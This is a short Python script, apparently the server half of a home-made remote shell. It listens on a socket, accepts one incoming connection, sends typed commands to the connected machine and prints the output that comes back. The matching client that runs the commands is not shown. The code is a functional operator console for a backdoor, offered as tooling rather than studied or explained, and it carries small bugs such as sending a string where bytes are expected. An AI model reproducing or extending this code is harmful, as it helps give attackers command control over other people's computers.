#server side
#not multi threading, so several commands dont work
#doesnt work smoothly since implementation for python 3 is different and complicating for decoding and encoding
import socket
import sys
import subprocess as sp

host = sys.argv[1]
port = int(sys.argv[2]) 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(100)
conn,adrr = s.accept()
print ("receiveing connection from :%s" %(str(adrr[0])))

while 1:
	command = input("#> ")
	if command != "exit()":
		if command == "":
			continue
		command=command.encode()
		conn.send(command)
		result = conn.recv(100)
		result=result.decode()
# i must check the size of a date since tcp is received in chunks so one recv might be not enough, i check the size		
		size=int(result[:16])
		message=result[16:]
		print("size of buffer is %d" %(size))
		testnum=len(message)
		print("size of message is %d" %(testnum))
		
		
		while size > len(message):
			result = conn.recv(100)
			result=result.decode()
			
			
			message+=result
			message+="\r\n"
		print (message)
	else:
		conn.send("exit()")
		print ("the shell is going down..")
		break
s.close()
		
		
		 
		
			
